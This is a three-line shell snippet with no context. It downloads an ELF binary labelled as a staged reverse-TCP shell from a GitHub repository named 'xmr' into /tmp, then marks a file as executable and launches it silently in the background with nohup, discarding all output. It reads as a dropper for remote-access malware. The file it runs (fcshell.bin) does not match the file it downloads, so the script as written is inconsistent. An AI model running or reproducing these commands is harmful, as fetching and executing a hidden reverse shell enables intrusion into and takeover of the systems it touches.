wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/linux-shell-staged-reverse-tcp-8383.elf
chmod +x /tmp/fcshell.bin
nohup /tmp/fcshell.bin >/dev/null 2>&1 &
